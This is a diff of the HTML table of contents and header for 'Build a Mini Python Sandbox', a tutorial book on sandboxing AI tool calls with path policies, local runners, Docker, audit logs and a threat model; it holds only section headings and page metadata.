@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Introduction</title>
+<title>Build a Mini Python Sandbox</title>
 <link rel="stylesheet" href="assets/explainer.css">
 <script>
 (function () {
@@ -21,193 +21,218 @@
 <div class="shell">
 
   <aside class="sidebar">
-    <a class="side-kicker" href="#top">explainer &middot; explainer</a>
-    <p class="side-title">Introduction</p>
-    <p class="side-sub">A styled explainer page.</p>
+    <a class="side-kicker" href="#top">Mini Python Sandbox &middot; explainer</a>
+    <p class="side-title">Build a Mini Python Sandbox</p>
+    <p class="side-sub">A short, runnable book about turning model tool calls into bounded, auditable operating-system actions.</p>
     <div class="side-rule"></div>
     <p class="side-label">Contents</p>
     <nav class="toc" id="toc">
-      <a href="#s01" class="l2"><span class="n">01</span><span>What the book builds</span></a>
-      <a href="#s02" class="l2"><span class="n">02</span><span>Quick start</span></a>
-      <a href="#s03" class="l2"><span class="n">03</span><span>Rebuild the book artifacts</span></a>
-      <a href="#s04" class="l2"><span class="n">04</span><span>Repository map</span></a>
-      <a href="#s05" class="l2"><span class="n">05</span><span>Design rules used throughout</span></a>
-      <a href="#s06" class="l2"><span class="n">06</span><span>Test map</span></a>
-      <a href="#s07" class="l2"><span class="n">07</span><span>Platform notes</span></a>
-      <a href="#s08" class="l2"><span class="n">08</span><span>Where to start reading</span></a>
-      <a href="#s09" class="l2"><span class="n">09</span><span>Chapter 0 — Stage 0: The naive fence</span></a>
-      <a href="#s10" class="l2"><span class="n">10</span><span>The shape we are building</span></a>
-      <a href="#s11" class="l2"><span class="n">11</span><span>What changed</span></a>
-      <a href="#s12" class="l2"><span class="n">12</span><span>The three holes</span></a>
-      <a href="#s12-01" class="l3"><span class="n"></span><span>1. A prefix check is not a containment check</span></a>
-      <a href="#s12-02" class="l3"><span class="n"></span><span>2. A symlink is inside the workspace by name and outside by target</span></a>
-      <a href="#s12-03" class="l3"><span class="n"></span><span>3. A shell is not a command runner</span></a>
-      <a href="#s13" class="l2"><span class="n">13</span><span>Run it</span></a>
-      <a href="#s14" class="l2"><span class="n">14</span><span>It works when</span></a>
-      <a href="#s15" class="l2"><span class="n">15</span><span>Why keep the broken code?</span></a>
-      <a href="#s16" class="l2"><span class="n">16</span><span>Stage limits</span></a>
-      <a href="#s17" class="l2"><span class="n">17</span><span>If it goes wrong</span></a>
-      <a href="#s18" class="l2"><span class="n">18</span><span>Read next</span></a>
-      <a href="#s19" class="l2"><span class="n">19</span><span>Chapter 1 — Stage 1: One path policy</span></a>
-      <a href="#s20" class="l2"><span class="n">20</span><span>The problem</span></a>
-      <a href="#s21" class="l2"><span class="n">21</span><span>What changed</span></a>
-      <a href="#s22" class="l2"><span class="n">22</span><span>The central algorithm</span></a>
-      <a href="#s22-01" class="l3"><span class="n"></span><span>Resolve the deepest existing ancestor</span></a>
-      <a href="#s22-02" class="l3"><span class="n"></span><span>Compare real paths with commonpath</span></a>
-      <a href="#s22-03" class="l3"><span class="n"></span><span>Reads and writes differ on purpose</span></a>
-      <a href="#s22-04" class="l3"><span class="n"></span><span>Platform spellings are normalised before validation</span></a>
-      <a href="#s23" class="l2"><span class="n">23</span><span>Run it</span></a>
-      <a href="#s24" class="l2"><span class="n">24</span><span>It works when</span></a>
-      <a href="#s25" class="l2"><span class="n">25</span><span>Stage limits</span></a>
-      <a href="#s26" class="l2"><span class="n">26</span><span>If it goes wrong</span></a>
-      <a href="#s27" class="l2"><span class="n">27</span><span>Read next</span></a>
-      <a href="#s28" class="l2"><span class="n">28</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></a>
-      <a href="#s29" class="l2"><span class="n">29</span><span>The problem</span></a>
-      <a href="#s30" class="l2"><span class="n">30</span><span>What changed</span></a>
-      <a href="#s31" class="l2"><span class="n">31</span><span>The contract</span></a>
-      <a href="#s31-01" class="l3"><span class="n"></span><span>Limits</span></a>
-      <a href="#s31-02" class="l3"><span class="n"></span><span>Reads are byte-bounded</span></a>
-      <a href="#s31-03" class="l3"><span class="n"></span><span>Writes are atomic</span></a>
-      <a href="#s31-04" class="l3"><span class="n"></span><span>Edits are unique by default</span></a>
-      <a href="#s31-05" class="l3"><span class="n"></span><span>Deletes are file-only</span></a>
-      <a href="#s31-06" class="l3"><span class="n"></span><span>Errors become observations</span></a>
-      <a href="#s32" class="l2"><span class="n">32</span><span>Run it</span></a>
-      <a href="#s33" class="l2"><span class="n">33</span><span>It works when</span></a>
-      <a href="#s34" class="l2"><span class="n">34</span><span>Stage limits</span></a>
-      <a href="#s35" class="l2"><span class="n">35</span><span>If it goes wrong</span></a>
-      <a href="#s36" class="l2"><span class="n">36</span><span>Read next</span></a>
-      <a href="#s37" class="l2"><span class="n">37</span><span>Chapter 3 — Stage 3: Running code locally</span></a>
-      <a href="#s38" class="l2"><span class="n">38</span><span>The problem</span></a>
-      <a href="#s39" class="l2"><span class="n">39</span><span>What changed</span></a>
-      <a href="#s40" class="l2"><span class="n">40</span><span>The seven controls</span></a>
-      <a href="#s40-01" class="l3"><span class="n"></span><span>1. Argv, not a string</span></a>
-      <a href="#s40-02" class="l3"><span class="n"></span><span>2. An absolute-path allowlist</span></a>
-      <a href="#s40-03" class="l3"><span class="n"></span><span>3. A clean environment</span></a>
-      <a href="#s40-04" class="l3"><span class="n"></span><span>4. A timeout with a process-tree kill</span></a>
-      <a href="#s40-05" class="l3"><span class="n"></span><span>5. Output caps that still drain</span></a>
-      <a href="#s40-06" class="l3"><span class="n"></span><span>6. POSIX resource limits</span></a>
-      <a href="#s40-07" class="l3"><span class="n"></span><span>7. A workspace-relative working directory</span></a>
-      <a href="#s41" class="l2"><span class="n">41</span><span>What the demo proves, honestly</span></a>
-      <a href="#s42" class="l2"><span class="n">42</span><span>Run it</span></a>
-      <a href="#s43" class="l2"><span class="n">43</span><span>It works when</span></a>
-      <a href="#s44" class="l2"><span class="n">44</span><span>Stage limits</span></a>
-      <a href="#s45" class="l2"><span class="n">45</span><span>If it goes wrong</span></a>
-      <a href="#s46" class="l2"><span class="n">46</span><span>Read next</span></a>
-      <a href="#s47" class="l2"><span class="n">47</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></a>
-      <a href="#s48" class="l2"><span class="n">48</span><span>The problem</span></a>
-      <a href="#s49" class="l2"><span class="n">49</span><span>What changed</span></a>
-      <a href="#s50" class="l2"><span class="n">50</span><span>The image contract</span></a>
-      <a href="#s51" class="l2"><span class="n">51</span><span>The run contract</span></a>
-      <a href="#s52" class="l2"><span class="n">52</span><span>The important subtlety: read-only root is not read-only workspace</span></a>
-      <a href="#s53" class="l2"><span class="n">53</span><span>Timeout cleanup</span></a>
-      <a href="#s54" class="l2"><span class="n">54</span><span>Run it</span></a>
-      <a href="#s55" class="l2"><span class="n">55</span><span>It works when</span></a>
-      <a href="#s56" class="l2"><span class="n">56</span><span>Stage limits</span></a>
-      <a href="#s57" class="l2"><span class="n">57</span><span>If it goes wrong</span></a>
-      <a href="#s58" class="l2"><span class="n">58</span><span>Read next</span></a>
-      <a href="#s59" class="l2"><span class="n">59</span><span>Chapter 5 — Stage 5: The finished harness</span></a>
-      <a href="#s60" class="l2"><span class="n">60</span><span>The problem</span></a>
-      <a href="#s61" class="l2"><span class="n">61</span><span>What changed</span></a>
-      <a href="#s62" class="l2"><span class="n">62</span><span>The toolbox</span></a>
-      <a href="#s63" class="l2"><span class="n">63</span><span>The loop</span></a>
-      <a href="#s64" class="l2"><span class="n">64</span><span>The audit log</span></a>
-      <a href="#s65" class="l2"><span class="n">65</span><span>The scripted demo</span></a>
-      <a href="#s66" class="l2"><span class="n">66</span><span>End-to-end acceptance</span></a>
-      <a href="#s67" class="l2"><span class="n">67</span><span>Stage limits</span></a>
-      <a href="#s68" class="l2"><span class="n">68</span><span>If it goes wrong</span></a>
-      <a href="#s69" class="l2"><span class="n">69</span><span>Read next</span></a>
-      <a href="#s70" class="l2"><span class="n">70</span><span>Threat model</span></a>
-      <a href="#s71" class="l2"><span class="n">71</span><span>1. Assets</span></a>
-      <a href="#s72" class="l2"><span class="n">72</span><span>2. Actors and assumptions</span></a>
-      <a href="#s73" class="l2"><span class="n">73</span><span>3. Trust boundaries</span></a>
-      <a href="#s74" class="l2"><span class="n">74</span><span>4. Threats and controls</span></a>
-      <a href="#s74-01" class="l3"><span class="n"></span><span>T1 — Path traversal</span></a>
-      <a href="#s74-02" class="l3"><span class="n"></span><span>T2 — Prefix-sibling escape</span></a>
-      <a href="#s74-03" class="l3"><span class="n"></span><span>T3 — Symlink escape</span></a>
-      <a href="#s74-04" class="l3"><span class="n"></span><span>T4 — Windows-specific path confusion</span></a>
-      <a href="#s74-05" class="l3"><span class="n"></span><span>T5 — Shell injection</span></a>
-      <a href="#s74-06" class="l3"><span class="n"></span><span>T6 — Environment leakage</span></a>
-      <a href="#s74-07" class="l3"><span class="n"></span><span>T7 — Resource exhaustion</span></a>
-      <a href="#s74-08" class="l3"><span class="n"></span><span>T8 — Network access and exfiltration</span></a>
-      <a href="#s74-09" class="l3"><span class="n"></span><span>T9 — Container escape / privilege escalation</span></a>
-      <a href="#s74-10" class="l3"><span class="n"></span><span>T10 — Image supply chain</span></a>
-      <a href="#s74-11" class="l3"><span class="n"></span><span>T11 — Audit tampering</span></a>
-      <a href="#s74-12" class="l3"><span class="n"></span><span>T12 — Prompt injection through tool output</span></a>
-      <a href="#s74-13" class="l3"><span class="n"></span><span>T13 — Denial of service against the agent loop</span></a>
-      <a href="#s75" class="l2"><span class="n">75</span><span>5. Controls by stage</span></a>
-      <a href="#s76" class="l2"><span class="n">76</span><span>6. Residual risk statement</span></a>
-      <a href="#s77" class="l2"><span class="n">77</span><span>7. Review checklist</span></a>
-      <a href="#s78" class="l2"><span class="n">78</span><span>Operations runbook</span></a>
-      <a href="#s79" class="l2"><span class="n">79</span><span>1. Prerequisites</span></a>
-      <a href="#s80" class="l2"><span class="n">80</span><span>2. Install and verify</span></a>
-      <a href="#s81" class="l2"><span class="n">81</span><span>3. Configuration</span></a>
-      <a href="#s82" class="l2"><span class="n">82</span><span>4. Docker daemon security</span></a>
-      <a href="#s83" class="l2"><span class="n">83</span><span>5. Image lifecycle</span></a>
-      <a href="#s84" class="l2"><span class="n">84</span><span>6. Audit lifecycle</span></a>
-      <a href="#s84-01" class="l3"><span class="n"></span><span>Audit verification</span></a>
-      <a href="#s85" class="l2"><span class="n">85</span><span>7. Monitoring and alerts</span></a>
-      <a href="#s86" class="l2"><span class="n">86</span><span>8. Incident response</span></a>
-      <a href="#s86-01" class="l3"><span class="n"></span><span>Suspected sandbox escape or host compromise</span></a>
-      <a href="#s86-02" class="l3"><span class="n"></span><span>Audit chain failure</span></a>
-      <a href="#s86-03" class="l3"><span class="n"></span><span>Runaway container</span></a>
-      <a href="#s87" class="l2"><span class="n">87</span><span>9. Kill switch</span></a>
-      <a href="#s88" class="l2"><span class="n">88</span><span>10. Windows and macOS notes</span></a>
-      <a href="#s89" class="l2"><span class="n">89</span><span>11. Capacity planning</span></a>
-      <a href="#s90" class="l2"><span class="n">90</span><span>12. Change control checklist</span></a>
-      <a href="#s91" class="l2"><span class="n">91</span><span>Plan — the stage contract</span></a>
-      <a href="#s92" class="l2"><span class="n">92</span><span>Global rules</span></a>
-      <a href="#s93" class="l2"><span class="n">93</span><span>Stage 0 — The naive fence</span></a>
-      <a href="#s94" class="l2"><span class="n">94</span><span>Stage 1 — One path policy</span></a>
-      <a href="#s95" class="l2"><span class="n">95</span><span>Stage 2 — The sandbox and file tools</span></a>
-      <a href="#s96" class="l2"><span class="n">96</span><span>Stage 3 — Running code locally</span></a>
-      <a href="#s97" class="l2"><span class="n">97</span><span>Stage 4 — Docker as the real wall</span></a>
-      <a href="#s98" class="l2"><span class="n">98</span><span>Stage 5 — The finished harness</span></a>
-      <a href="#s99" class="l2"><span class="n">99</span><span>Stage boundaries and non-goals</span></a>
-      <a href="#s100" class="l2"><span class="n">100</span><span>Definition of done for the whole book</span></a>
-      <a href="#s101" class="l2"><span class="n">101</span><span>Function reference</span></a>
-      <a href="#s102" class="l2"><span class="n">102</span><span>Where to start</span></a>
-      <a href="#s103" class="l2"><span class="n">103</span><span>File map</span></a>
-      <a href="#s103-01" class="l3"><span class="n"></span><span>ch00/mini_harness/unsafe.py</span></a>
-      <a href="#s103-02" class="l3"><span class="n"></span><span>ch01/miniharness/pathpolicy.py</span></a>
-      <a href="#s103-03" class="l3"><span class="n"></span><span>ch02/mini_harness/sandbox.py</span></a>
-      <a href="#s103-04" class="l3"><span class="n"></span><span>ch02/miniharness/filetools.py</span></a>
-      <a href="#s103-05" class="l3"><span class="n"></span><span>ch03/miniharness/localrunner.py</span></a>
-      <a href="#s103-06" class="l3"><span class="n"></span><span>ch03/miniharness/commandtool.py</span></a>
-      <a href="#s103-07" class="l3"><span class="n"></span><span>ch04/miniharness/dockerrunner.py</span></a>
-      <a href="#s103-08" class="l3"><span class="n"></span><span>ch05/mini_harness/toolbox.py</span></a>
-      <a href="#s103-09" class="l3"><span class="n"></span><span>ch05/miniharness/dockertools.py</span></a>
-      <a href="#s103-10" class="l3"><span class="n"></span><span>ch05/mini_harness/audit.py</span></a>
-      <a href="#s103-11" class="l3"><span class="n"></span><span>ch05/mini_harness/agent.py</span></a>
-      <a href="#s103-12" class="l3"><span class="n"></span><span>ch05/mini_harness/cli.py</span></a>
-      <a href="#s103-13" class="l3"><span class="n"></span><span>ch00–ch05 demos</span></a>
-      <a href="#s104" class="l2"><span class="n">104</span><span>Alphabetical index</span></a>
-      <a href="#s105" class="l2"><span class="n">105</span><span>Observation vocabulary</span></a>
-      <a href="#s106" class="l2"><span class="n">106</span><span>Constants worth knowing</span></a>
+      <a href="#s01" class="l2"><span class="n">01</span><span>Introduction</span></a>
+      <a href="#s01-01" class="l3"><span class="n"></span><span>What the book builds</span></a>
+      <a href="#s01-02" class="l3"><span class="n"></span><span>Quick start</span></a>
+      <a href="#s01-02-01" class="l4"><span class="n"></span><span>Demo presentation</span></a>
+      <a href="#s01-03" class="l3"><span class="n"></span><span>Rebuild the book artifacts</span></a>
+      <a href="#s01-04" class="l3"><span class="n"></span><span>Repository map</span></a>
+      <a href="#s01-05" class="l3"><span class="n"></span><span>Design rules used throughout</span></a>
+      <a href="#s01-06" class="l3"><span class="n"></span><span>Test map</span></a>
+      <a href="#s01-07" class="l3"><span class="n"></span><span>Platform notes</span></a>
+      <a href="#s01-08" class="l3"><span class="n"></span><span>Where to start reading</span></a>
+      <a href="#s02" class="l2"><span class="n">02</span><span>Chapter 0 — Stage 0: The naive fence</span></a>
+      <a href="#s02-01" class="l3"><span class="n"></span><span>The shape we are building</span></a>
+      <a href="#s02-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s02-03" class="l3"><span class="n"></span><span>The three holes</span></a>
+      <a href="#s02-03-01" class="l4"><span class="n"></span><span>1. A prefix check is not a containment check</span></a>
+      <a href="#s02-03-02" class="l4"><span class="n"></span><span>2. A symlink is inside the workspace by name and outside by target</span></a>
+      <a href="#s02-03-03" class="l4"><span class="n"></span><span>3. A shell is not a command runner</span></a>
+      <a href="#s02-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s02-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s02-06" class="l3"><span class="n"></span><span>Why keep the broken code?</span></a>
+      <a href="#s02-07" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s02-08" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s02-09" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s03" class="l2"><span class="n">03</span><span>Chapter 1 — Stage 1: One path policy</span></a>
+      <a href="#s03-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s03-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s03-03" class="l3"><span class="n"></span><span>The central algorithm</span></a>
+      <a href="#s03-03-01" class="l4"><span class="n"></span><span>Resolve the deepest existing ancestor</span></a>
+      <a href="#s03-03-02" class="l4"><span class="n"></span><span>Compare real paths with commonpath</span></a>
+      <a href="#s03-03-03" class="l4"><span class="n"></span><span>Reads and writes differ on purpose</span></a>
+      <a href="#s03-03-04" class="l4"><span class="n"></span><span>Platform spellings are normalised before validation</span></a>
+      <a href="#s03-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s03-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s03-06" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s03-07" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s03-08" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s04" class="l2"><span class="n">04</span><span>Chapter 2 — Stage 2: The sandbox object and file tools</span></a>
+      <a href="#s04-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s04-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s04-03" class="l3"><span class="n"></span><span>The contract</span></a>
+      <a href="#s04-03-01" class="l4"><span class="n"></span><span>Limits</span></a>
+      <a href="#s04-03-02" class="l4"><span class="n"></span><span>Reads are byte-bounded</span></a>
+      <a href="#s04-03-03" class="l4"><span class="n"></span><span>Writes are atomic</span></a>
+      <a href="#s04-03-04" class="l4"><span class="n"></span><span>Edits are unique by default</span></a>
+      <a href="#s04-03-05" class="l4"><span class="n"></span><span>Deletes are file-only</span></a>
+      <a href="#s04-03-06" class="l4"><span class="n"></span><span>Errors become observations</span></a>
+      <a href="#s04-04" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s04-05" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s04-06" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s04-07" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s04-08" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s05" class="l2"><span class="n">05</span><span>Chapter 3 — Stage 3: Running code locally</span></a>
+      <a href="#s05-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s05-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s05-03" class="l3"><span class="n"></span><span>The seven controls</span></a>
+      <a href="#s05-03-01" class="l4"><span class="n"></span><span>1. Argv, not a string</span></a>
+      <a href="#s05-03-02" class="l4"><span class="n"></span><span>2. An absolute-path allowlist</span></a>
+      <a href="#s05-03-03" class="l4"><span class="n"></span><span>3. A clean environment</span></a>
+      <a href="#s05-03-04" class="l4"><span class="n"></span><span>4. A timeout with a process-tree kill</span></a>
+      <a href="#s05-03-05" class="l4"><span class="n"></span><span>5. Output caps that still drain</span></a>
+      <a href="#s05-03-06" class="l4"><span class="n"></span><span>6. POSIX resource limits</span></a>
+      <a href="#s05-03-07" class="l4"><span class="n"></span><span>7. A workspace-relative working directory</span></a>
+      <a href="#s05-04" class="l3"><span class="n"></span><span>What the demo proves, honestly</span></a>
+      <a href="#s05-05" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s05-06" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s05-07" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s05-08" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s05-09" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s06" class="l2"><span class="n">06</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></a>
+      <a href="#s06-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s06-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s06-03" class="l3"><span class="n"></span><span>The image contract</span></a>
+      <a href="#s06-04" class="l3"><span class="n"></span><span>The run contract</span></a>
+      <a href="#s06-05" class="l3"><span class="n"></span><span>The important subtlety: read-only root is not read-only workspace</span></a>
+      <a href="#s06-06" class="l3"><span class="n"></span><span>Timeout cleanup</span></a>
+      <a href="#s06-07" class="l3"><span class="n"></span><span>Run it</span></a>
+      <a href="#s06-08" class="l3"><span class="n"></span><span>It works when</span></a>
+      <a href="#s06-09" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s06-10" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s06-11" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s07" class="l2"><span class="n">07</span><span>Chapter 5 — Stage 5: The finished harness</span></a>
+      <a href="#s07-01" class="l3"><span class="n"></span><span>The problem</span></a>
+      <a href="#s07-02" class="l3"><span class="n"></span><span>What changed</span></a>
+      <a href="#s07-03" class="l3"><span class="n"></span><span>The toolbox</span></a>
+      <a href="#s07-04" class="l3"><span class="n"></span><span>The loop</span></a>
+      <a href="#s07-05" class="l3"><span class="n"></span><span>The audit log</span></a>
+      <a href="#s07-06" class="l3"><span class="n"></span><span>The scripted demo</span></a>
+      <a href="#s07-07" class="l3"><span class="n"></span><span>End-to-end acceptance</span></a>
+      <a href="#s07-08" class="l3"><span class="n"></span><span>Stage limits</span></a>
+      <a href="#s07-09" class="l3"><span class="n"></span><span>If it goes wrong</span></a>
+      <a href="#s07-10" class="l3"><span class="n"></span><span>Read next</span></a>
+      <a href="#s08" class="l2"><span class="n">08</span><span>Threat model</span></a>
+      <a href="#s08-01" class="l3"><span class="n"></span><span>1. Assets</span></a>
+      <a href="#s08-02" class="l3"><span class="n"></span><span>2. Actors and assumptions</span></a>
+      <a href="#s08-03" class="l3"><span class="n"></span><span>3. Trust boundaries</span></a>
+      <a href="#s08-04" class="l3"><span class="n"></span><span>4. Threats and controls</span></a>
+      <a href="#s08-04-01" class="l4"><span class="n"></span><span>T1 — Path traversal</span></a>
+      <a href="#s08-04-02" class="l4"><span class="n"></span><span>T2 — Prefix-sibling escape</span></a>
+      <a href="#s08-04-03" class="l4"><span class="n"></span><span>T3 — Symlink escape</span></a>
+      <a href="#s08-04-04" class="l4"><span class="n"></span><span>T4 — Windows-specific path confusion</span></a>
+      <a href="#s08-04-05" class="l4"><span class="n"></span><span>T5 — Shell injection</span></a>
+      <a href="#s08-04-06" class="l4"><span class="n"></span><span>T6 — Environment leakage</span></a>
+      <a href="#s08-04-07" class="l4"><span class="n"></span><span>T7 — Resource exhaustion</span></a>
+      <a href="#s08-04-08" class="l4"><span class="n"></span><span>T8 — Network access and exfiltration</span></a>
+      <a href="#s08-04-09" class="l4"><span class="n"></span><span>T9 — Container escape / privilege escalation</span></a>
+      <a href="#s08-04-10" class="l4"><span class="n"></span><span>T10 — Image supply chain</span></a>
+      <a href="#s08-04-11" class="l4"><span class="n"></span><span>T11 — Audit tampering</span></a>
+      <a href="#s08-04-12" class="l4"><span class="n"></span><span>T12 — Prompt injection through tool output</span></a>
+      <a href="#s08-04-13" class="l4"><span class="n"></span><span>T13 — Denial of service against the agent loop</span></a>
+      <a href="#s08-05" class="l3"><span class="n"></span><span>5. Controls by stage</span></a>
+      <a href="#s08-06" class="l3"><span class="n"></span><span>6. Residual risk statement</span></a>
+      <a href="#s08-07" class="l3"><span class="n"></span><span>7. Review checklist</span></a>
+      <a href="#s09" class="l2"><span class="n">09</span><span>Operations runbook</span></a>
+      <a href="#s09-01" class="l3"><span class="n"></span><span>1. Prerequisites</span></a>
+      <a href="#s09-02" class="l3"><span class="n"></span><span>2. Install and verify</span></a>
+      <a href="#s09-03" class="l3"><span class="n"></span><span>3. Configuration</span></a>
+      <a href="#s09-04" class="l3"><span class="n"></span><span>4. Docker daemon security</span></a>
+      <a href="#s09-05" class="l3"><span class="n"></span><span>5. Image lifecycle</span></a>
+      <a href="#s09-06" class="l3"><span class="n"></span><span>6. Audit lifecycle</span></a>
+      <a href="#s09-06-01" class="l4"><span class="n"></span><span>Audit verification</span></a>
+      <a href="#s09-07" class="l3"><span class="n"></span><span>7. Monitoring and alerts</span></a>
+      <a href="#s09-08" class="l3"><span class="n"></span><span>8. Incident response</span></a>
+      <a href="#s09-08-01" class="l4"><span class="n"></span><span>Suspected sandbox escape or host compromise</span></a>
+      <a href="#s09-08-02" class="l4"><span class="n"></span><span>Audit chain failure</span></a>
+      <a href="#s09-08-03" class="l4"><span class="n"></span><span>Runaway container</span></a>
+      <a href="#s09-09" class="l3"><span class="n"></span><span>9. Kill switch</span></a>
+      <a href="#s09-10" class="l3"><span class="n"></span><span>10. Windows and macOS notes</span></a>
+      <a href="#s09-11" class="l3"><span class="n"></span><span>11. Capacity planning</span></a>
+      <a href="#s09-12" class="l3"><span class="n"></span><span>12. Change control checklist</span></a>
+      <a href="#s10" class="l2"><span class="n">10</span><span>Plan — the stage contract</span></a>
+      <a href="#s10-01" class="l3"><span class="n"></span><span>Global rules</span></a>
+      <a href="#s10-02" class="l3"><span class="n"></span><span>Stage 0 — The naive fence</span></a>
+      <a href="#s10-03" class="l3"><span class="n"></span><span>Stage 1 — One path policy</span></a>
+      <a href="#s10-04" class="l3"><span class="n"></span><span>Stage 2 — The sandbox and file tools</span></a>
+      <a href="#s10-05" class="l3"><span class="n"></span><span>Stage 3 — Running code locally</span></a>
+      <a href="#s10-06" class="l3"><span class="n"></span><span>Stage 4 — Docker as the real wall</span></a>
+      <a href="#s10-07" class="l3"><span class="n"></span><span>Stage 5 — The finished harness</span></a>
+      <a href="#s10-08" class="l3"><span class="n"></span><span>Stage boundaries and non-goals</span></a>
+      <a href="#s10-09" class="l3"><span class="n"></span><span>Definition of done for the whole book</span></a>
+      <a href="#s11" class="l2"><span class="n">11</span><span>Function reference</span></a>
+      <a href="#s11-01" class="l3"><span class="n"></span><span>Where to start</span></a>
+      <a href="#s11-02" class="l3"><span class="n"></span><span>File map</span></a>
+      <a href="#s11-02-01" class="l4"><span class="n"></span><span>ch00/mini_harness/unsafe.py</span></a>
+      <a href="#s11-02-02" class="l4"><span class="n"></span><span>ch01/miniharness/pathpolicy.py</span></a>
+      <a href="#s11-02-03" class="l4"><span class="n"></span><span>ch02/mini_harness/sandbox.py</span></a>
+      <a href="#s11-02-04" class="l4"><span class="n"></span><span>ch02/miniharness/filetools.py</span></a>
+      <a href="#s11-02-05" class="l4"><span class="n"></span><span>ch03/miniharness/localrunner.py</span></a>
+      <a href="#s11-02-06" class="l4"><span class="n"></span><span>ch03/miniharness/commandtool.py</span></a>
+      <a href="#s11-02-07" class="l4"><span class="n"></span><span>ch04/miniharness/dockerrunner.py</span></a>
+      <a href="#s11-02-08" class="l4"><span class="n"></span><span>ch05/mini_harness/toolbox.py</span></a>
+      <a href="#s11-02-09" class="l4"><span class="n"></span><span>ch05/miniharness/dockertools.py</span></a>
+      <a href="#s11-02-10" class="l4"><span class="n"></span><span>ch05/mini_harness/audit.py</span></a>
+      <a href="#s11-02-11" class="l4"><span class="n"></span><span>ch05/mini_harness/agent.py</span></a>
+      <a href="#s11-02-12" class="l4"><span class="n"></span><span>ch05/mini_harness/cli.py</span></a>
+      <a href="#s11-02-13" class="l4"><span class="n"></span><span>ch00–ch05 demos</span></a>
+      <a href="#s11-02-14" class="l4"><span class="n"></span><span>ch00/mini_harness/ui.py (identical in every chapter)</span></a>
+      <a href="#s11-03" class="l3"><span class="n"></span><span>Alphabetical index</span></a>
+      <a href="#s11-04" class="l3"><span class="n"></span><span>Observation vocabulary</span></a>
+      <a href="#s11-05" class="l3"><span class="n"></span><span>Constants worth knowing</span></a>
+      <a href="#s12" class="l2"><span class="n">12</span><span>Appendix E — Instructor and recording companion</span></a>
+      <a href="#s12-01" class="l3"><span class="n"></span><span>How to read the note cards</span></a>
+      <a href="#s12-02" class="l3"><span class="n"></span><span>Series shape and timing</span></a>
+      <a href="#s12-03" class="l3"><span class="n"></span><span>Pre-record checklist</span></a>
+      <a href="#s12-04" class="l3"><span class="n"></span><span>Screen and scene setup</span></a>
+      <a href="#s12-05" class="l3"><span class="n"></span><span>Episode run sheets</span></a>
+      <a href="#s12-05-01" class="l4"><span class="n"></span><span>Trailer and introduction</span></a>
+      <a href="#s12-05-02" class="l4"><span class="n"></span><span>Episode 0 — The naive fence</span></a>
+      <a href="#s12-05-03" class="l4"><span class="n"></span><span>Episode 1 — One path policy</span></a>
+      <a href="#s12-05-04" class="l4"><span class="n"></span><span>Episode 2 — The sandbox and file tools</span></a>
+      <a href="#s12-05-05" class="l4"><span class="n"></span><span>Episode 3 — Running code locally</span></a>
+      <a href="#s12-05-06" class="l4"><span class="n"></span><span>Episode 4 — Docker as the real wall</span></a>
+      <a href="#s12-05-07" class="l4"><span class="n"></span><span>Episode 5 — The finished harness</span></a>
+      <a href="#s12-06" class="l3"><span class="n"></span><span>Demo reset between takes</span></a>
+      <a href="#s12-07" class="l3"><span class="n"></span><span>Common recording failures</span></a>
+      <a href="#s12-08" class="l3"><span class="n"></span><span>Audience questions to plant</span></a>
+      <a href="#s12-09" class="l3"><span class="n"></span><span>Titles, thumbnails, and descriptions</span></a>
+      <a href="#s12-10" class="l3"><span class="n"></span><span>Editing notes</span></a>
+      <a href="#s12-11" class="l3"><span class="n"></span><span>Final checklist before publishing</span></a>
     </nav>
     <div class="side-foot">
-      Built from <code>book_html.md</code><br>
-      106 sections
+      Built from book_html.md · six stages and five appendices
     </div>
   </aside>
 
   <main class="pane" id="top">
     <div class="inner">
       <header class="page-heading">
-        <p class="eyebrow">Reading guide</p>
-        <h1>Introduction</h1>
-        <p class="lede">Converted from book_html.md.</p>
+        <p class="eyebrow">Mini Python Sandbox · six stages</p>
+        <h1>Build a Mini Python Sandbox</h1>
+        <p class="lede">A short, runnable book about turning model tool calls into bounded, auditable operating-system actions.</p>
         <p class="meta">
-          <span>106 sections</span>
-          <span>generated page</span>
+          <span>6 chapters</span>
+          <span>5 appendices</span>
+          <span>Python 3.11+</span>
+          <span>pytest</span>
         </p>
       </header>
 
